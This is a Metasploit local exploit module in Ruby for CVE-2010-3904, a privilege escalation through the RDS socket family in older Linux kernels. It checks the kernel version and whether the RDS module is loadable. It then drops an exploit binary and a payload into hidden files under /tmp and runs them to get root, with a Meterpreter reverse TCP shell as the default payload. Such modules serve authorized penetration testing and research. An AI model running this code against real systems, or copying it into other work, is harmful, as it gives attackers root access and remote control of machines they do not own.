##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Post::Linux::Compile
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Module::Deprecated
  prepend Msf::Exploit::Remote::AutoCheck

  moved_from 'exploit/linux/local/rds_priv_esc'

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Reliable Datagram Sockets (RDS) rds_page_copy_user Privilege Escalation',
      'Description'    => %q{
        This module exploits a vulnerability in the `rds_page_copy_user` function
        in `net/rds/page.c` (RDS) in Linux kernel versions 2.6.30 to 2.6.36-rc8
        to execute code as root (CVE-2010-3904).

        This module has been tested successfully on:

        Fedora 13 (i686) kernel version 2.6.33.3-85.fc13.i686.PAE; and
        Ubuntu 10.04 (x86_64) with kernel version 2.6.32-21-generic.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Dan Rosenberg', # Discovery and C exploit
          'bcoles'         # Metasploit
        ],
      'DisclosureDate' => '2010-10-20',
      'Platform'       => [ 'linux' ],
      'Arch'           => [ ARCH_X86, ARCH_X64 ],
      'SessionTypes'   => [ 'shell', 'meterpreter' ],
      'Targets'        => [[ 'Auto', {} ]],
      'Privileged'     => true,
      'References'     =>
        [
          [ 'EDB', '15285' ],
          [ 'CVE', '2010-3904' ],
          [ 'BID', '44219' ],
          [ 'URL', 'https://securitytracker.com/id?1024613' ],
          [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=799c10559d60f159ab2232203f222f18fa3c4a5f' ],
          [ 'URL', 'http://vulnfactory.org/exploits/rds-fail.c' ],
          [ 'URL', 'http://web.archive.org/web/20101020044047/http://www.vsecurity.com/resources/advisory/20101019-1/' ],
          [ 'URL', 'http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c' ],
        ],
      'DefaultOptions' =>
        {
          'PAYLOAD'     => 'linux/x86/meterpreter/reverse_tcp',
          'WfsDelay'    => 10,
          'PrependFork' => true
        },
      'Notes'          =>
        {
          'AKA'         => ['rds-fail.c'],
          'Reliability' => [ UNRELIABLE_SESSION ],
          'Stability'   => [ CRASH_SAFE ],
          'SideEffects' => [ ARTIFACTS_ON_DISK ]
        },
      'DefaultTarget'  => 0))
    register_advanced_options [
      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
    ]
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def modules_disabled?
    modules_disabled = cmd_exec('cat /proc/sys/kernel/modules_disabled').to_s.strip
    (modules_disabled.eql?('1') || modules_disabled.eql?('2'))
  end

  def upload(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def check
    version = kernel_release
    unless Rex::Version.new(version.split('-').first) >= Rex::Version.new('2.6.30') &&
           Rex::Version.new(version.split('-').first) < Rex::Version.new('2.6.37')
      return CheckCode::Safe("Linux kernel version #{version} is not vulnerable")
    end
    vprint_good "Linux kernel version #{version} appears to be vulnerable"

    unless cmd_exec('/sbin/modinfo rds').to_s.include? 'Reliable Datagram Sockets'
      return CheckCode::Safe('RDS kernel module is not available')
    end
    vprint_good 'RDS kernel module is available'

    if modules_disabled?
      unless cmd_exec('/sbin/lsmod').to_s.include? 'rds'
        return CheckCode::Safe('RDS kernel module is not loadable')
      end
    end
    vprint_good 'RDS kernel module is loadable'

    CheckCode::Appears
  end

  def exploit
    if !datastore['ForceExploit'] && is_root?
      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    executable_path = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}"

    if live_compile?
      vprint_status 'Live compiling exploit on system...'
      upload_and_compile executable_path, exploit_data('cve-2010-3904', 'rds-fail.c')
    else
      vprint_status 'Dropping pre-compiled exploit on system...'
      arch = kernel_hardware
      case arch
      when /amd64|ia64|x86_64|x64/i
        upload_and_chmodx executable_path, exploit_data('cve-2010-3904', 'rds-fail.x64')
      when /x86|i[3456]86/
        upload_and_chmodx executable_path, exploit_data('cve-2010-3904', 'rds-fail.x86')
      else
        fail_with Failure::NoTarget, "No pre-compiled binaries are available for system architecture: #{arch}"
      end
    end

    payload_path = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}"
    upload_and_chmodx payload_path, generate_payload_exe

    print_status 'Launching exploit...'
    output = cmd_exec "#{executable_path} #{payload_path}"
    output.each_line { |line| vprint_status line.chomp }
  end
end
